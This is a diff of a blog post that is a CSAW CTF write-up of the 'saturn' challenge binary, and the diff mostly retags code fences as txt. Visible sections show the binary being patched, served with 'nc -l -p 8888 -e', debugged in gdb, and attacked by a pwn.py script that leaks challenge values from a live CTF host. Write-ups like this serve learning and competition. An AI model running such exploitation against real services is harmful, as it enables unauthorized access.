@@ -26,17 +26,17 @@ The challenge, worth 400 points, is the second-last in the list of exploitation 
 > Written by crowell
 
 Once downloaded, we take a look at the details of the file:
-```
+``` txt
 $ file saturn
 saturn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa55828fef5637b04d127681ada4a06b332d54a9c, stripped
 ```
 The binary is an x86 (hooray!) ELF but has been stripped (booo) which means general analysis in `gdb` isn't going to be pleasant. On attempting to run this binary we get an error printed to the console:
-```
+``` txt
 $ ./saturn
 ./saturn: error while loading shared libraries: libchallengeresponse.so: cannot open shared object file: No such file or directory
 ```
 Just like the instructions indicated, we don't have the required library `libchallengeresponse.so` handy and so we can't run it. Let's see which functions it depends on by using `objdump`:
-```
+``` txt
 $ objdump --dynamic-reloc ./saturn
 
 ./saturn:         file format elf32-i386
@@ -72,12 +72,12 @@ To fix up the binary to allow it to function we need to:
 ## Preparing the Binary
 
 I used [patchelf][] to remove the reference to the library from the `saturn` binary using the `--remove-needed` switch, like so:
-```
+``` txt
 $ ./patchelf --remove-needed libchallengeresponse.so ./saturn
 ```
 
 When we run the binary now, we get a different error:
-```
+``` txt
 $ ./saturn 
 ./saturn: symbol lookup error: ./saturn: undefined symbol: fillChallengeResponse
 ```
@@ -141,7 +141,7 @@ With the patches applied, the disassembly of the function call site now looks li
 
 We can see all the references have been removed, and the jump at the end is not conditional. We can now copy this binary back to Linux to see if it runs. However, we can't just run it by itself, because if we do, it will crash thanks to the `CC` instruction we added. So to validate that it works, we can run it via `gdb`:
 
-```
+``` txt
 $ gdb ./saturn
   ... snip ...
 [-------------------------------------code-------------------------------------]
@@ -162,7 +162,7 @@ $ gdb ./saturn
   ... snip ...
 ```
 Excellent! The application now runs, and hits our breakpoint instruction. We can see the `NOP` instructions leading up to it, and the `JMP` instruction immediately after which leaps over the `exit` call. When we type `c` to continue, we get:
-```
+``` txt
 gdb-peda$ c
 Continuing.
 CSAW ChallengeResponseAuthenticationProtocol Flag Storage
@@ -179,7 +179,7 @@ I've had a few people ask me why I didn't just use `LD_LIBRARY_PATH`/`LD_PRELOAD
 As we can see from the above run in `gdb`, the program reads from `stdin` and writes to `stdout`. However, when we connect to it over a network, we need to talk via sockets. In order to simulate this scenario, and allow us to create an exploit which we don't have to modify when we target the remote host, we need to get this application running behind a socket.
 
 One of the things that is particularly annoying about such challenges is that they're a pain in the butt to debug behind the likes of `xinit`. Instead, what I do is hide it behind a backgrounded instance of `netcat` set up to constantly accept new connections on the same port as the live target, like so:
-```
+``` txt
 $ nc -l -p 8888 -e ./saturn -k &
 [1] 789
 ```
@@ -191,7 +191,7 @@ Your version of `nc` might be different to mine, but the command line above says
 * `-k`: Accept multiple connections in listen mode (aka "keep open").
 
 The backgrounded process' ID is rendered to screen, in this case it's `789`, and we can use this ID to attach to it via `gdb`:
-```
+``` txt
 $ gdb -p 789
 GNU gdb (GDB) Fedora 7.6.1-46.fc19
   ... snip ...
@@ -199,11 +199,11 @@ gdb-peda$ c
 Continuing.
 ```
 To make sure this is working, we launch an `nc` client and connect to the port:
-```
+``` txt
 $ nc localhost 8888
 ```
 Then in `gdb`:
-```
+``` txt
 [New process 30599]
   ... snip ...
 [-------------------------------------code-------------------------------------]
@@ -224,7 +224,7 @@ Then in `gdb`:
   ... snip ...
 ```
 This is looking very familiar. When we hit `c` again in `gdb`, the process continues and we see the `nc` client receive the prompt appear:
-```
+``` txt
 $ nc localhost 8888
 CSAW ChallengeResponseAuthenticationProtocol Flag Storage
 ```
@@ -319,19 +319,19 @@ for i in range(0, cr_count):
 
 # close the socket/finish up
 sock.close()
-
 ```
+
 Back to `gdb`, reattach to the parent process by typing:
 
 1. `attach <pid>`
 1. `c`
 
 Next, run the script above giving it the host (`127.0.0.1`) and port (`8888`) of the target. When run, `gdb` should hit the breakpoint at the point of entry. To analyse the flow of information through the process, set a breakpoint to the spot immediately after the first byte is read by typing:
-```
+``` txt
 break *0x08048ADD
 ```
 When done, type `c` to let `gdb` continue on, and you should see our new breakpoint get hit:
-```
+``` txt
 [----------------------------------registers-----------------------------------]
 EAX: 0xffffffa0 
 EBX: 0x4970b000 --> 0x4970ad9c --> 0x1 
@@ -367,7 +367,7 @@ Legend: code, data, rodata, value
 Breakpoint 1, 0x08048add in ?? ()
 ```
 Wonderful. We can see that `AL` (the right-most byte of `EAX`) is set to `A0`, which is the same as `0xA0 + 0` (ie. the first command coming from our script). To prove that this is indeed what's going on, type `c` and you should see another request come in, this time the value should be `A1`:
-```
+``` txt
 gdb-peda$ c
 Continuing.
   ... snip ...
@@ -375,14 +375,14 @@ EAX: 0xffffffa1
   ... snip ...
 ```
 We can see that our requests are coming in as expected, but let's confirm the behaviour of the challenge functionality. Stepping over this line (`si`) results in `EAX` being masked, and the value left over is just the `A0` which identifies this as a _get challenge_ packet:
-```
+``` txt
 gdb-peda$ si
   ... snip ...
 EAX: 0xa0 
   ... snip ...
 ```
 A comparison then happens and we take a branch over to the code which calls the challenge fetching function. To get there quickly type `break *0x0804886D` and then `c`:
-```
+``` txt
 gdb-peda$ break *0x0804886D
 Breakpoint 2 at 0x804886d
 gdb-peda$ c
@@ -422,14 +422,14 @@ Legend: code, data, rodata, value
 Breakpoint 2, 0x0804886d in ?? ()
 ```
 Here we have landed right where the mask is applied to the input value to figure out the index of the challenge value to read. `EAX` contains `A1`, which is our input, and this should be masked out to `01` after a single `si`:
-```
+``` txt
 gdb-peda$ si
   ... snip ...
 EAX: 0x1 
   ... snip ...
 ```
 From here we know that a small calculation is done using the pointer to the challenge buffer and the value in `EAX` which results in the memory address of the challenge value we need to read. We single-step until we reach the instruction at `0x08048881`:
-```
+``` txt
 gdb-peda$ si
   ... snip ...
 EAX: 0x804a0c4 --> 0x0 
@@ -443,7 +443,7 @@ EAX: 0x804a0c4 --> 0x0
 At this point, `EAX` points somewhere inside the challenge array, and the next instruction will read 4 bytes of it into `EAX`. This value is then printed to screen (resulting in it being sent to the caller).
 
 With this functionality confirmed, we can just let our script run. Clear all breakpoints by typing `delete breakpoints` and then `c` to continue. The script's output should look something like this:
-```
+``` txt
 $ ./pwn.py 127.0.0.1 8888
 Challenge 0: 0x00000000
 Challenge 1: 0x00000000
@@ -455,7 +455,7 @@ Challenge 6: 0x00000000
 Challenge 7: 0x00000000
 ```
 Each value is `0` in our case because we removed the call which fills these values out! So to confirm that we're getting something meaningful, let's point the script at the CSAW host and see what it does:
-```
+``` txt
 $ ./pwn.py 54.85.89.65 8888
 Challenge 0: 0x43a0983c
 Challenge 1: 0x6a39eeb9
@@ -579,11 +579,11 @@ sock.close()
 
 ```
 Assuming everything is ready to run, launch the script (targeting your local instance of course). When the first breakpoint is hit, set another breakpoint here:
-```
+``` txt
 break *0x080488FB
 ```
 This point is where the index value is extracted for a response packet. Continue the program (`c`) and the second breakpoint will get hit:
-```
+``` txt
 gdb-peda$ break *0x080488FB
 Breakpoint 1 at 0x80488fb
 gdb-peda$ c
@@ -623,7 +623,7 @@ Legend: code, data, rodata, value
 Breakpoint 1, 0x080488fb in ?? ()
 ```
 We can see that `EAX` is set to `0`, and this makes sense given that the first value that we are passing in is `E0`. So our initial index is `0`. Single-step forward until we reach `0x804890c`:
-```
+``` txt
 gdb-peda$ si
   .. snip ..
 EAX: 0x804a0e0 --> 0x0 
@@ -638,18 +638,18 @@ EAX: 0x804a0e0 --> 0x0
   .. snip ..
 ```
 Here we see the response array is being read, from index `0`. Single step again, and we can see the value in this array location iiiiiiss...
-```
+``` txt
 gdb-peda$ si
   .. snip ..
 EAX: 0x0 
   .. snip ..
 ```
 ... zero! Again, this makes sense as we have not run any code to initialise the response array, so the values probably all going to be `0`. From here, let's jump to the point just after the response value is read from the input stream by doing:
-```
+``` txt
 break *0x0804892F
 ```
 Then `c` to continue:
-```
+``` txt
 gdb-peda$ c
   ... snip ...
 EAX: 0x1 
@@ -665,7 +665,7 @@ EAX: 0x1
   ... snip ...
 ```
 `EAX` contains the value of `1`; our first response value. Step forward (`si`) to `0x08048938`:
-```
+``` txt
 gdb-peda$ si
   ... snip ...
 EAX: 0x1 
@@ -683,7 +683,7 @@ EAX: 0x1
   ... snip ...
 ```
 The value that is in `[ebp-0x10]` is the value that was pull out of the response array. In our case, this is `0` again. Hence, when these two values are compared the result is that they are _not_ equal. As indicated, the jump past the call to `exit` is not taken and the process exits. The output of our script looks like this:
-```
+``` txt
 $ ./pwn.py 127.0.0.1 8888
 Challenge 0: 0x00000000
 Response  0: 0x00000001
@@ -691,11 +691,11 @@ Connection dropped
 ```
 
 The last thing we want to validate is that the flags are set appropriately when valid data is sent. To do this, modify the Python script so that it just sends back `0`. Get set up again for debugging, launch the script, and when the first breakpoint is reached, set another:
-```
+``` txt
 break *0x08048938
 ```
 Then hit `c` for continue. With this breakpoint hit, you'll see the following:
-```
+``` txt
 gdb-peda$ c
   ... snip ...
 [-------------------------------------code-------------------------------------]
@@ -715,7 +715,7 @@ gdb-peda$ c
   ... snip ...
 ```
 This time the jump is actually taken because `0` matches the response value. If we single-step twice, we will see that `EAX` contains the index to be used in the flag array, and then stepping again we'll see that the flag value is set. Disabling breakpoints and letting the script run will result in all of the values being set correctly:
-```
+``` txt
 $ ./pwn.py 127.0.0.1 8888
 Challenge 0: 0x00000000
 Response  0: 0x00000000
@@ -767,7 +767,7 @@ The presence of the `flag_array` is a bit of a sign. The summary of this functio
 The net effect of this code is that all of the flag values are multiplied together. If any of them are not set (ie. they're `0`) then the result will be `0`. If they are _all_ set, the result will be `1`. This proves that to get access to the flag, this function needs to return `1`, and hence we need to make sure we set _all_ of the responses correctly. Let's quickly see it in action.
 
 First, create a file in the same folder as the binary, call it `flag.txt` and store any value in it you like:
-```
+``` txt
 $ cat flag.txt
 slartibartfast
 ```
@@ -853,10 +853,10 @@ print "Flag: " + get_flag(sock)
 
 # close the socket/finish up
 sock.close()
+```
 
-```
 Go through the debug config dance, and run this against your local install, this is what happens:
-```
+``` txt
 $ ./pwn.py 127.0.0.1 8888
 Challenge 0: 0x00000000
 Response  0: 0x00000000
@@ -985,7 +985,7 @@ print "Flag: " + get_flag(sock)
 sock.close()
 ```
 And what's the result? Well, let's just fire it straight at CSAW and see what happens:
-```
+``` txt
 $ ./pwn.py 54.85.89.65 8888
 Response  0: 0x77ef6aea
 Response  1: 0x6e7b372a
